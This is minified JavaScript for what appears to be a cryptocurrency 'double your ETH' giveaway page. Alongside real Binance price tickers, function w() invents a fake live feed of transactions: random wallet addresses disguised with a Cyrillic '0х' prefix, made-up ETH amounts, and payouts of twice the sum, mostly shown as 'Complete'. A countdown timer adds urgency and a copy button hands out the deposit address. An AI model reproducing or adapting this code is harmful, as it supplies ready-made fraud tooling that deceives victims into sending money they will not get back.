(function () {
  const t = document.createElement("link").relList;
  if (t && t.supports && t.supports("modulepreload")) return;
  for (const n of document.querySelectorAll('link[rel="modulepreload"]')) a(n);
  new MutationObserver((n) => {
    for (const o of n)
      if (o.type === "childList")
        for (const r of o.addedNodes)
          r.tagName === "LINK" && r.rel === "modulepreload" && a(r);
  }).observe(document, { childList: !0, subtree: !0 });
  function s(n) {
    const o = {};
    return (
      n.integrity && (o.integrity = n.integrity),
      n.referrerPolicy && (o.referrerPolicy = n.referrerPolicy),
      n.crossOrigin === "use-credentials"
        ? (o.credentials = "include")
        : n.crossOrigin === "anonymous"
        ? (o.credentials = "omit")
        : (o.credentials = "same-origin"),
      o
    );
  }
  function a(n) {
    if (n.ep) return;
    n.ep = !0;
    const o = s(n);
    fetch(n.href, o);
  }
})();
function p(e, t) {
  return Math.floor(Math.random() * (t - e + 1)) + e;
}
function h() {
  const e = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  let s = "0х";
  for (let a = 1; a < 15; a++) {
    const n = p(0, e.length - 1);
    s += e[n];
  }
  return s + "...";
}
$(".qr-item>span").on("click", function () {
  $(".qr-fill").toggleClass("active"), $(this).toggleClass("active");
});
const g = (e, t) => {
  $(`.item.${t}`).removeClass("active"), $(`.item.${e}`).addClass("active");
};
function y(e, t) {
  let s = e * 60 + t;
  const a = () => {
    const o = Math.floor(s / 60),
      r = s % 60,
      f = o < 10 ? `0${o}` : o,
      v = r < 10 ? `0${r}` : r;
    $(".time > p").text(`${f}:${v}`), s <= 0 ? clearInterval(n) : s--;
  };
  a();
  const n = setInterval(a, 1e3);
}
let c = !1;
$(".swine").on("click", function () {
  this.dataset.next == "item-c" &&
    !c &&
    ((c = !0), y(timedata.min, timedata.sec)),
    g(this.dataset.next, this.dataset.current);
});
function b() {
  const e = "0123456789abcdef";
  let s = "";
  for (let a = 0; a < 15; a++) {
    const n = p(0, e.length - 1);
    s += e[n];
  }
  return (s + "...").toUpperCase();
}
function C(e, t) {
  return (Math.random() * (t - e) + e).toFixed(2);
}
function i(e) {
  return e.toLocaleString("en-US");
}
function x(e) {
  const t = Math.random();
  return t < 0.7 && e > 0.1
    ? { cl: "status-a", nm: "Complete" }
    : t < 0.9 && e < 0.1
    ? { cl: "status-b", nm: "Canceled" }
    : { cl: "status-c", nm: "In progress" };
}
function w() {
  const e = C(0.01, 30),
    t = e * 2,
    s = x(e);
  return `<div class=item-live><div class=item><p>${b()}</div><div class='item fite'><p>${h()}</div><div class=item><p>${i(
    e
  )} ETH</div><div class='item fite lw'><p>${i(
    s.cl == "status-b" ? e : t
  )} ETH</div><div class="item ${s.cl}"><p>${s.nm}</div></div>`;
}
function m() {
  $(".body-live").prepend(w()), setTimeout(m, F(4e3, 1e4));
}
m();
function F(e, t) {
  return Math.floor(Math.random() * (t - e + 1) + e);
}
const L = (e) => {
  if (navigator.clipboard) navigator.clipboard.writeText(e);
  else {
    const t = document.createElement("textarea");
    (t.value = e),
      document.body.appendChild(t),
      t.select(),
      document.execCommand("copy"),
      document.body.removeChild(t);
  }
};
let l;
$(".copy").on("click", function () {
  clearTimeout(l),
    L($(".cp-tx").text()),
    $(".notif").addClass("active"),
    (l = setTimeout(() => {
      $(".notif").removeClass("active");
    }, 2e3));
});
let M = new WebSocket("wss://stream.binance.com:9443/ws/btcusdt@ticker"),
  d = !0;
M.onmessage = (e) => {
  d && ((d = !1), $(".type-ca").removeClass("wait"));
  let t = JSON.parse(e.data),
    s = t.P,
    a = t.c;
  s.includes("-")
    ? $(".type-ca>span").addClass("dec")
    : $(".type-ca>span").removeClass("dec"),
    $(".type-ca>span>span").text(parseFloat(s).toFixed(2)),
    $(".type-ca>p>span").text(parseFloat(a).toFixed(2));
};
let S = new WebSocket("wss://stream.binance.com:9443/ws/ethusdt@ticker"),
  u = !0;
S.onmessage = (e) => {
  u && ((u = !1), $(".type-cb").removeClass("wait"));
  let t = JSON.parse(e.data),
    s = t.P,
    a = t.c;
  s.includes("-")
    ? $(".type-cb>span").addClass("dec")
    : $(".type-cb>span").removeClass("dec"),
    $(".type-cb>span>span").text(parseFloat(s).toFixed(2)),
    $(".type-cb>p>span").text(parseFloat(a).toFixed(2));
};
$(".vis").fadeOut();
